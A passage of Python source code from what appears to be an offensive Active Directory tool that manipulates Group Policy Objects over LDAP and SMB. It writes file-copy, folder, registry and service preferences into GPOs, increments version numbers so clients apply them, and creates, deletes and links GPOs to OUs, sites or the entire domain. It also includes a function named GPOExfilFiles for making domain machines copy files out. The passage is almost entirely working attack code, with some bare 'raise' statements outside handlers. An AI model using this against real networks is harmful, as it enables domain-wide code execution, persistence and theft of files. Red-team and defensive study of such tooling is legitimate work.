        path = path[path.index("\\sysvol\\")+7:]
        return path

    def updateVersion(self, gpo):
        searchFilter = "(&(objectCategory=groupPolicyContainer)(name=%s))" % gpo
        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        print("[*] Requesting %s version and location from LDAP" % gpo)
        self.ldaprecords = []
        retvalue = self.ldapQuery(searchFilter, ['versionNumber', 'gPCFileSysPath'])
        if retvalue != True:
                raise
        entries = self.ldapconn.entries
        dn = entries[0].entry_dn
        loc = entries[0]['gPCFileSysPath'].value + "\\GPT.INI"
        loc = self.fixPath(loc)
        oldVersion = int(entries[0]["versionNumber"].value)
        newVersion = oldVersion + 1
        print("[*] Updating from version [%s] to [%s]" % (oldVersion, newVersion))
        self.ldapconn.modify(dn, {'versionNumber':(ldap3.MODIFY_REPLACE, [newVersion])})
        if self.ldapconn.result['result'] != 0:
            raise
        try:
            if self.smbconn == '':
                self.conn2smb()
            orig = self.SMBReadFile(loc)
            target = "Version=%s" % oldVersion
            replacement = "Version=%s" % newVersion
            modified = orig.replace(bytes(target.encode("utf-8")), bytes(replacement.encode("utf-8")))
            self.SMBWriteFile(loc, modified)

        except:
            raise
        print("[+] Version updated succesfully!")

    def GPOBackup(self, location, gpo):
        print("[*] Creating backup folder")
        os.mkdir(location)
        entries = self.ldapGPOInfo('*', gpo)
        info = entries[0][self.gpoattr]
        print("[*] Saving " + self.gpoattr + " values as " + self.gpoattr + ".txt")
        file = open(location + "/" + self.gpoattr + ".txt", "w")
        file.write(str(info))
        file.close()
        if self.smbconn == '':
            self.conn2smb()
        root = str(entries[0]["gPCFileSysPath"])
        files = self.SMBDownloadRecursive(root, location)



    def GPOCopyFile(self, srcPath, dstPath, hidden, gpo):
        (path, info, dn) = self.extractInfo(gpo)

        filename = dstPath[dstPath.rindex("\\") + 1:]
        remotePath = path + "\\" + self.gpopath + "\\" + filename
        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Files\\Files.xml"

        template = self.template_file.replace("CHANGEME_NAME", filename)
        now = datetime.now()
        date = now.strftime("%Y-%m-%d %H:%M:%S")
        template = template.replace("CHANGEME_TIMESTAMP", date)
        if srcPath[:2] == "\\\\":
            template = template.replace("CHANGEME_FROMPATH", srcPath)
        else:
            template = template.replace("CHANGEME_FROMPATH", path + "\\" + self.gpopath + "\\" + filename)
        template = template.replace("CHANGEME_TOPATH", dstPath)
        template = template.replace("CHANGEME_HIDDEN", str(hidden))
        template = template.replace("CHANGEME_UID", self.generateGUID())
        template = template.replace("CHANGEME_CONTEXT", self.context)

        if self.smbconn == '':
            self.conn2smb()
        if srcPath[:2] != "\\\\":
            self.SMBUploadFile(srcPath, remotePath)

        if "Files" in info[0]:
            k = ""
            try:
                orig = self.SMBReadFile(xmlPath)
                modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
                self.SMBWriteFile(xmlPath, modified)
            except:
                raise
        else:
            k = "Files"
            try:
                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
            except:
                pass
            orig = bytes(self.template_file_new.encode("utf-8"))
            modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
            self.SMBWriteFile(xmlPath, modified)

        self.updateGUID(info, k, ['Group Policy Files', 'Files'], dn)

    def GPOExfilFiles(self, srcPath, dstPath, hidden, gpo):
        (path, info, dn) = self.extractInfo(gpo)

        filename = dstPath[dstPath.rindex("\\") + 1:]
        remotePath = path + "\\" + self.gpopath + "\\" + filename
        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Files\\Files.xml"

        template = self.template_file.replace("CHANGEME_NAME", filename)
        now = datetime.now()
        date = now.strftime("%Y-%m-%d %H:%M:%S")
        template = template.replace("CHANGEME_TIMESTAMP", date)
        template = template.replace("CHANGEME_FROMPATH", srcPath)
        template = template.replace("CHANGEME_TOPATH", dstPath)
        template = template.replace("CHANGEME_HIDDEN", str(hidden))
        template = template.replace("CHANGEME_UID", self.generateGUID())
        template = template.replace("CHANGEME_CONTEXT", self.context)

        if self.smbconn == '':
            self.conn2smb()

        if "Files" in info[0]:
            k = ""
            try:
                orig = self.SMBReadFile(xmlPath)
                modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
                self.SMBWriteFile(xmlPath, modified)
            except:
                raise
        else:
            k = "Files"
            try:
                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
            except:
                pass
            orig = bytes(self.template_file_new.encode("utf-8"))
            modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
            self.SMBWriteFile(xmlPath, modified)
        self.updateGUID(info, k, ['Group Policy Files', 'Files'], dn)



    def GPOCreateFolder(self, dstPath, hidden, gpo):
        (path, info, dn) = self.extractInfo(gpo)

        foldername = dstPath[dstPath.rindex("\\") + 1:]
        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Folders\\Folders.xml"

        template = self.template_folder.replace("CHANGEME_NAME", foldername)
        now = datetime.now()
        date = now.strftime("%Y-%m-%d %H:%M:%S")
        template = template.replace("CHANGEME_TIMESTAMP", date)
        template = template.replace("CHANGEME_PATH", dstPath)
        template = template.replace("CHANGEME_HIDDEN", str(hidden))
        template = template.replace("CHANGEME_UID", self.generateGUID())
        template = template.replace("CHANGEME_CONTEXT", self.context)

        if self.smbconn == '':
            self.conn2smb()

        if "Folders" in info[0]:
            k = ""
            try:
                orig = self.SMBReadFile(xmlPath)
                modified = orig.replace(b'</Folders>', bytes(template.encode("utf-8")))
                self.SMBWriteFile(xmlPath, modified)
            except:
                raise
        else:
            k = "Folders"
            try:
                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences\\Folders")
            except:
                pass
            orig = bytes(self.template_folder_new.encode("utf-8"))
            modified = orig.replace(b'</Folders>', bytes(template.encode("utf-8")))
            self.SMBWriteFile(xmlPath, modified)

        self.updateGUID(info, k, ['Group Policy Folders', 'Folders'], dn)

    def GPORegCreate(self, hive, key, subkey, t, value, default, gpo):
        (path, info, dn) = self.extractInfo(gpo)
        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Registry\\Registry.xml"

        if subkey == "":
            name = key[key.rindex("\\") + 1:]
        else:
            name = subkey

        template = self.template_registry.replace("CHANGEME_NAME", name)
        template = template.replace("CHANGEME_STATUS", name)
        now = datetime.now()
        date = now.strftime("%Y-%m-%d %H:%M:%S")
        template = template.replace("CHANGEME_TIMESTAMP", date)
        template = template.replace("CHANGEME_UID", self.generateGUID())
        template = template.replace("CHANGEME_CONTEXT", self.context)
        template = template.replace("CHANGEME_DEFAULT", default)
        template = template.replace("CHANGEME_HIVE", hive)
        template = template.replace("CHANGEME_KEY", key)
        template = template.replace("CHANGEME_SUBKEY", subkey)
        template = template.replace("CHANGEME_VALUE", value)
        template = template.replace("CHANGEME_TYPE", t)

        if self.smbconn == '':
            self.conn2smb()

        if "Registry" in info[0]:
            k = ""
            try:
                orig = self.SMBReadFile(xmlPath)
                modified = orig.replace(b'</RegistrySettings>', bytes(template.encode("utf-8")))
                self.SMBWriteFile(xmlPath, modified)
            except:
                raise
        else:
            k = "Registry"
            try:
                self.smbconn.createDirectory('SysVol', path + "\\"+ self.gpopath +"\\Preferences\\Registry")
            except:
                pass
            orig = bytes(self.template_registry_new.encode("utf-8"))
            modified = orig.replace(b'</RegistrySettings>', bytes(template.encode("utf-8")))
            self.SMBWriteFile(xmlPath, modified)

        self.updateGUID(info, k, ['Group Policy Registry', 'Registry'], dn)


    def CreateGPOFiles(self,domain,gpo_guid, display_name):

        if self.smbconn == '':
            self.conn2smb()
        files = self.smbconn.listPath("SYSVOL", f"{domain}/Policies/*")

        exist = False

        print(f"[+] Checking if folder with guid {{{gpo_guid}}} exist")

        for file in files:

            if file.get_longname() == f"{{{gpo_guid}}}":

                exist = True

                break

        if exist:

            print(f"[-] The GPO with guid {{{gpo_guid}}} already exists")
            exit(1)

        print("[+] Creating necessary gpo files and folders")

        try:

            gpo_content = f"""[General]
Version=0
displayName={display_name}

            """

            fh = open("./GPT.INI", "w+b")
            fh.write(gpo_content.encode('utf-8'))
            fh.seek(0)

            self.smbconn.createDirectory("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}")
            self.smbconn.createDirectory("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}/Machine")
            self.smbconn.createDirectory("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}/User")
            self.smbconn.putFile("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}/GPT.INI", fh.read)

            fh.close()
            os.remove("./GPT.INI")

            if self.__options.comment is not None:
                
                comment = self.__options.comment
                fh = open("./GPO.cmt", "w+b")
                fh.write(comment.encode('utf-8'))
                fh.seek(0)
                self.smbconn.putFile("SYSVOL", f"{domain}/Policies/{{{gpo_guid}}}/GPO.cmt", fh.read)

                fh.close()
                os.remove("./GPO.cmt")

            print(f"[+] GPO created")
            exit(0)

        except Exception as e:

            print(f"[-] Failed to create dir or file with exception {e}")
            exit(1)


    def CreateGPO(self, GPOName):
        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        #get domain from DN
        parts = base.split(',')
        domain_parts = [part.split('=')[1] for part in parts if part.startswith('DC=')]
        domain = '.'.join(domain_parts)

        gpo_guid = str(uuid.uuid4()).upper()

        #gpo_cn = 'CN=' + GPOName + ',CN=Policies,CN=System,' + base
        gpo_cn = f"CN={{{gpo_guid}}},CN=Policies,CN=System,{base}"

        attributes = {
            'objectClass': ['top', 'groupPolicyContainer'],
            'cn': f"{{{gpo_guid}}}",
            'displayName': GPOName,
            'name': f"{{{gpo_guid}}}",
            'gPCFileSysPath': f'\\\\{domain}\\SYSVOL\\{domain}\\Policies\\{{{gpo_guid}}}',
            'gPCFunctionalityVersion': '2',
            'versionnumber': '0'
        }

        # Add the GPO to AD
        self.ldapconn.add(gpo_cn, attributes=attributes)
        if not self.ldapconn.result['description'] == 'success':
            print(f'[-] Failed to create GPO: {self.ldapconn.result["description"]}')

        else:
            self.CreateGPOFiles(domain,gpo_guid, GPOName)

    def CheckForDuplicates(self,GPOName):
        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        print(f"[+] Checking if the GPO with name {GPOName} alreay exist.")

        if len(self.ldapconn.entries) >= 1:

            print(f'[-] A gpo with the name "{GPOName}" and guid "{self.ldapconn.entries[0].cn}" already exist.')
            
            return True

        return False

    def DeleteGPOFiles(self,domain,gpo_guid):

        def delete_folder_recursive(share_name, folder_path):
            try:
                items = self.smbconn.listPath(share_name, folder_path+"/*")
                for i in range(len(items)):
                    item_name = items[i].get_longname()
                    if item_name in [".", ".."]:
                        continue
                    full_path = f"{folder_path}/{item_name}"
                    if items[i].is_directory() > 0:
                        delete_folder_recursive(share_name, full_path)
                        self.smbconn.deleteDirectory(share_name, full_path)
                    else:
                        self.smbconn.deleteFile(share_name, full_path)
            except Exception as e:
                print(f"[-] Could not remove dir {folder_path} with error {e}")

        if self.smbconn == '':
            self.conn2smb()
        files = self.smbconn.listPath("SYSVOL", f"{domain}/Policies/*")

        exist = False

        print(f"[+] Checking if folder with guid {gpo_guid} exist")

        for file in files:

            if file.get_longname() == f"{gpo_guid}":

                exist = True

                break

        if exist:
            
            try:

                print(f"[+] The GPO with guid {gpo_guid} found, proceding to remove")   
                items = self.smbconn.listPath("SYSVOL", f"{domain}/Policies/{gpo_guid}/*")
                for i in range(len(items)):
                    item_name = items[i].get_longname()
                    if item_name in [".", ".."]:
                        continue
                    full_path = f"{domain}/Policies/{gpo_guid}/{item_name}"
                    if items[i].is_directory() > 0:
                        delete_folder_recursive("SYSVOL", full_path)
                        self.smbconn.deleteDirectory("SYSVOL", full_path)
                    else:
                        self.smbconn.deleteFile("SYSVOL", full_path)

                self.smbconn.deleteDirectory("SYSVOL", f"{domain}/Policies/{gpo_guid}")

                print(f"[+] The GPO with guid {gpo_guid} got removed from the domain")
                exit(0)

            except Exception as e:

                print(f"[-] Could not remove dir {gpo_guid} with error {e}")
                exit(1)

        print(f"GPO with the guid {gpo_guid} was not found in the SYSVOL folder")
        exit(1)


    def DeleteGPO(self, GPOName):
        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        #get domain from DN
        parts = base.split(',')
        domain_parts = [part.split('=')[1] for part in parts if part.startswith('DC=')]
        domain = '.'.join(domain_parts)

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )
        if len(self.ldapconn.entries) == 1:

            gpo_guid = str(self.ldapconn.entries[0].cn)

            gpo_dn = str(self.ldapconn.entries[0].distinguishedName)

            print(f"[+] GPO {GPOName} found proceding to remove")

            if self.ldapconn.delete(gpo_dn):
                self.DeleteGPOFiles(domain,gpo_guid)
            else:
                print(f'[-] Failed to delete GPO "{GPOName}": {self.ldapconn.result["description"]}')
                exit(1)

        else:            
            print(f"[-] GPO {GPOName} was not found in the domain...")
            exit(1)

    def RemoveLinkOU(self, OUName, GPOName):
        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        
        #getting the gpo hex

        print(f"[+] Checking if GPO {GPOName} exists")

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        if len(self.ldapconn.entries) == 0:

            print("[-] GPO not found in the domain")
            exit(1)
        
        gpo_hex = str(self.ldapconn.entries[0].cn)

        print(f"[+] GPO with hex {gpo_hex} found")

        #getting info from the OU
        searchFilter = "(&(objectCategory=organizationalUnit)(name=%s))" % (OUName)

        self.ldaprecords = []     

        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)

        if retvalue != True:
                raise

        entries = self.ldapconn.entries

        if len(entries) == 0:

            print("[-] OU not found")
            exit(1)

        for entry in entries:
            
            try:

                self.ldaprecords.append(entry["gPLink"])

            except ldap3.core.exceptions.LDAPKeyError:

                self.ldaprecords.append(' ')

            self.ldaprecords.append(entry["distinguishedname"])

        if self.ldaprecords[0] == ' ':

            print("[-] Attribute gPlink is empty, no link exist in this OU")

            sys.exit(1)


        old_gPLink = str(self.ldaprecords[0])

        new_gPLink = ''

        found = False

        for link in old_gPLink.split("["):

            if str(gpo_hex) in str(link):
                
                found = True
                continue

            new_gPLink += f"[{link}"

        if found is not True:

            print(f"[-] The GPO guid was not found in this gPLink")
            sys.exit(1)

        new_gPLink = new_gPLink[1::]

        OUDn =self.ldaprecords[1]

        print(f"[+] OU dn is {OUDn}")
        print(f"[+] OU old gPLink is {self.ldaprecords[0]}")
        print(f"[+] New gPLink is {new_gPLink}")

        if new_gPLink == '':

            self.ldapconn.modify(str(OUDn), {'gplink': [(ldap3.MODIFY_REPLACE, [])]})

        else:

            self.ldapconn.modify(str(OUDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})

        if not self.ldapconn.result['description'] == 'success':
            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
            sys.exit()
        
        print("[+] Removed old gpo link")
        sys.exit()        

    def LinkGPOTOOU(self,OUName,GPOName):

        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        
        #getting the gpo hex

        print(f"[+] Checking if GPO {GPOName} exists")

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        if len(self.ldapconn.entries) == 0:

            print("[-] GPO not found in the domain")
            exit(1)
        
        gpo_hex = str(self.ldapconn.entries[0].cn)

        print(f"[+] GPO with hex {gpo_hex} found")

        #getting info from the OU
        searchFilter = "(&(objectCategory=organizationalUnit)(name=%s))" % (OUName)

        self.ldaprecords = []     

        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)

        if retvalue != True:
                raise

        entries = self.ldapconn.entries

        if len(entries) == 0:

            print("[-] OU not found")
            exit(1)

        for entry in entries:
            
            try:

                self.ldaprecords.append(entry["gPLink"])

            except ldap3.core.exceptions.LDAPKeyError:

                self.ldaprecords.append(' ')

            self.ldaprecords.append(entry["distinguishedname"])

        if self.ldaprecords[0] != ' ':

            old_gPLink = self.ldaprecords[0]

            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]{old_gPLink}'

        else:

            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]'

        OUDn =self.ldaprecords[1]

        print(f"[+] OU dn is {OUDn}")
        print(f"[+] OU old gPLink is {self.ldaprecords[0]}")
        print(f"[+] New gPLink is {new_gPLink}")

        self.ldapconn.modify(str(OUDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})

        if not self.ldapconn.result['description'] == 'success':
            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
            sys.exit()
        
        print("[+] GPO linked successfully")
        sys.exit()

    def LinkGPOTOSITE(self,SITEName,GPOName):

        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)

        #getting the gpo hex

        print(f"[+] Checking if GPO {GPOName} exists")

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        if len(self.ldapconn.entries) == 0:

            print("[-] GPO not found in the domain")
            exit(1)
        
        gpo_hex = str(self.ldapconn.entries[0].cn)

        print(f"[+] GPO with hex {gpo_hex} found")

        #getting info from the SITE
        print(f"[+] Checking if SITE {SITEName} exists")
        self.ldaprecords = []   
        dn_prefix = "CN=Sites,CN=Configuration,"
        searchFilter = "(&(objectCategory=site)(name=%s))" % (SITEName)      

        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES, dn_prefix)

        if retvalue != True:
                raise

        entries = self.ldapconn.entries

        if len(entries) == 0:

            print("[-] SITE not found")
            exit(1)

        for entry in entries:
            
            try:

                self.ldaprecords.append(entry["gPLink"])

            except ldap3.core.exceptions.LDAPKeyError:

                self.ldaprecords.append(' ')

            self.ldaprecords.append(entry["distinguishedname"])

        if self.ldaprecords[0] != ' ':

            old_gPLink = self.ldaprecords[0]

            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]{old_gPLink}'

        else:

            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]'

        SITEDn =self.ldaprecords[1]

        print(f"[+] SITE dn is {SITEDn}")
        print(f"[+] SITE old gPLink is {self.ldaprecords[0]}")
        print(f"[+] New gPLink is {new_gPLink}")

        self.ldapconn.modify(str(SITEDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})

        if not self.ldapconn.result['description'] == 'success':
            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
            sys.exit()
        
        print("[+] GPO linked successfully")
        sys.exit()

    def RemoveLinkSITE(self, SITEName,GPOName):
        target = self.get_machine_name(self.__options, self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        
        #getting the gpo hex

        print(f"[+] Checking if GPO {GPOName} exists")

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        if len(self.ldapconn.entries) == 0:

            print("[-] GPO not found in the domain")
            exit(1)
        
        gpo_hex = str(self.ldapconn.entries[0].cn)

        print(f"[+] GPO with hex {gpo_hex} found")

        #getting info from the SITE
        print(f"[+] Checking if SITE {SITEName} exists")
        self.ldaprecords = []   
        dn_prefix = "CN=Sites,CN=Configuration,"
        searchFilter = "(&(objectCategory=site)(name=%s))" % (SITEName)      

        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES, dn_prefix)
        if retvalue != True:
                raise

        entries = self.ldapconn.entries

        if len(entries) == 0:

            print("[-] SITE not found")
            exit(1)

        for entry in entries:
            
            try:

                self.ldaprecords.append(entry["gPLink"])

            except ldap3.core.exceptions.LDAPKeyError:

                self.ldaprecords.append(' ')

            self.ldaprecords.append(entry["distinguishedname"])

        if self.ldaprecords[0] == ' ':

            print("[-] Attribute gPlink is empty, no link exist in this SITE")

            sys.exit(1)


        old_gPLink = str(self.ldaprecords[0])

        new_gPLink = ''

        found = False

        for link in old_gPLink.split("["):

            if str(gpo_hex) in str(link):
                
                found = True
                continue

            new_gPLink += f"[{link}"

        if found is not True:

            print(f"[-] The GPO guid was not found in this gPLink")
            sys.exit(1)

        new_gPLink = new_gPLink[1::]

        SITEDn =self.ldaprecords[1]

        print(f"[+] SITE dn is {SITEDn}")
        print(f"[+] SITE old gPLink is {self.ldaprecords[0]}")
        print(f"[+] New gPLink is {new_gPLink}")

        if new_gPLink == '':

            self.ldapconn.modify(str(SITEDn), {'gplink': [(ldap3.MODIFY_REPLACE, [])]})

        else:

            self.ldapconn.modify(str(SITEDn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})

        if not self.ldapconn.result['description'] == 'success':
            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
            sys.exit()
        
        print("[+] Removed old gpo link")
        sys.exit()

    def LinkGPOTODOMAIN(self,GPOName):

        target = self.get_machine_name(self.__options, self.__domain)
        domain_dn = self.DomainToDN(self.__domain)
        
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)

        #getting the gpo hex

        print(f"[+] Checking if GPO {GPOName} exists")

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        if len(self.ldapconn.entries) == 0:

            print("[-] GPO not found in the domain")
            exit(1)
        
        gpo_hex = str(self.ldapconn.entries[0].cn)

        print(f"[+] GPO with hex {gpo_hex} found")

        #getting info from the domain
        print(f"[+] Checking if DOMAIN {domain_dn} exists")
        self.ldaprecords = []   
        searchFilter = "(&(objectClass=*)(distinguishedname=%s))" % domain_dn     

        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)

        if retvalue != True:
                raise

        entries = self.ldapconn.entries

        if len(entries) == 0:

            print("[-] Domain not found")
            exit(1)

        for entry in entries:
            
            try:

                self.ldaprecords.append(entry["gPLink"])

            except ldap3.core.exceptions.LDAPKeyError:

                self.ldaprecords.append(' ')

            self.ldaprecords.append(entry["distinguishedname"])

        if self.ldaprecords[0] != ' ':

            old_gPLink = self.ldaprecords[0]

            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]{old_gPLink}'

        else:

            new_gPLink = f'[LDAP://cn={gpo_hex},cn=policies,cn=system,{base};0]'

        print(f"[+] Domain dn is {domain_dn}")
        print(f"[+] Domain old gPLink is {self.ldaprecords[0]}")
        print(f"[+] New gPLink is {new_gPLink}")

        self.ldapconn.modify(str(domain_dn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})

        if not self.ldapconn.result['description'] == 'success':
            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
            sys.exit()
        
        print("[+] GPO linked successfully")
        sys.exit()

    def RemoveLinkDOMAIN(self,GPOName):
        target = self.get_machine_name(self.__options, self.__domain)
        domain_dn = self.DomainToDN(self.__domain)
        if self.ldapconn == '':
            if self.__options.use_ldaps is True:
                try:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1_2, target)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    self.conn2ldap(ssl.PROTOCOL_TLSv1, target)
            else:
                self.conn2ldap(None, target)
        
        #getting the gpo hex

        print(f"[+] Checking if GPO {GPOName} exists")

        base = self.ldapconn.server.info.other['defaultNamingContext'][0]

        self.ldapconn.search(
            search_base='CN=Policies,CN=System,' + base,
            search_filter=f'(&(objectClass=groupPolicyContainer)(displayName={GPOName}))',
            attributes=['distinguishedName','cn']
        )

        if len(self.ldapconn.entries) == 0:

            print("[-] GPO not found in the domain")
            exit(1)
        
        gpo_hex = str(self.ldapconn.entries[0].cn)

        print(f"[+] GPO with hex {gpo_hex} found")

        #getting info from the DOMAIN
        print(f"[+] Checking if DOMAIN {domain_dn} exists")
        self.ldaprecords = []   
        searchFilter = "(&(objectClass=*)(distinguishedname=%s))" % domain_dn

        retvalue = self.ldapQuery(searchFilter, ldap3.ALL_ATTRIBUTES)
        if retvalue != True:
                raise

        entries = self.ldapconn.entries

        if len(entries) == 0:

            print("[-] DOMAIN not found")
            exit(1)

        for entry in entries:
            
            try:

                self.ldaprecords.append(entry["gPLink"])

            except ldap3.core.exceptions.LDAPKeyError:

                self.ldaprecords.append(' ')

            self.ldaprecords.append(entry["distinguishedname"])

        if self.ldaprecords[0] == ' ':

            print("[-] Attribute gPlink is empty, no link exist in this SITE")

            sys.exit(1)


        old_gPLink = str(self.ldaprecords[0])

        new_gPLink = ''

        found = False

        for link in old_gPLink.split("["):

            if str(gpo_hex) in str(link):
                
                found = True
                continue

            new_gPLink += f"[{link}"

        if found is not True:

            print(f"[-] The GPO guid was not found in this gPLink")
            sys.exit(1)

        new_gPLink = new_gPLink[1::]

        print(f"[+] DOMAIN dn is {domain_dn}")
        print(f"[+] SITE old gPLink is {self.ldaprecords[0]}")
        print(f"[+] New gPLink is {new_gPLink}")

        if new_gPLink == '':

            self.ldapconn.modify(str(domain_dn), {'gplink': [(ldap3.MODIFY_REPLACE, [])]})

        else:

            self.ldapconn.modify(str(domain_dn), {'gplink': [(ldap3.MODIFY_REPLACE, new_gPLink)]})

        if not self.ldapconn.result['description'] == 'success':
            print('[-] Failed to link GPO with error:', self.ldapconn.result['description'])
            sys.exit()
        
        print("[+] Removed old gpo link")
        sys.exit()

    def GPOService(self, action, name, gpo):
        (path, info, dn) = self.extractInfo(gpo)
        xmlPath = path + "\\" + self.gpopath +"\\Preferences\\Services\\Services.xml"

        now = datetime.now()
        date = now.strftime("%Y-%m-%d %H:%M:%S")
        template = self.template_service.replace("CHANGEME_NAME", name)
        template = template.replace("CHANGEME_TIMESTAMP", date)
        template = template.replace("CHANGEME_UID", self.generateGUID())
        template = template.replace("CHANGEME_CONTEXT", self.context)
        template = template.replace("CHANGEME_ACTION", action)

        if self.smbconn == '':
            self.conn2smb()

        if "Services" in info[0]:
            k = ""
            try:
                orig = self.SMBReadFile(xmlPath)
                modified = orig.replace(b'</NTServices>', bytes(template.encode("utf-8")))
                self.SMBWriteFile(xmlPath, modified)
            except:
                raise
        else:
            k = "Services"
            try:
                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences\\Services")
            except:
                pass
            orig = bytes(self.template_service_new.encode("utf-8"))
            modified = orig.replace(b'</NTServices>', bytes(template.encode("utf-8")))
            self.SMBWriteFile(xmlPath, modified)
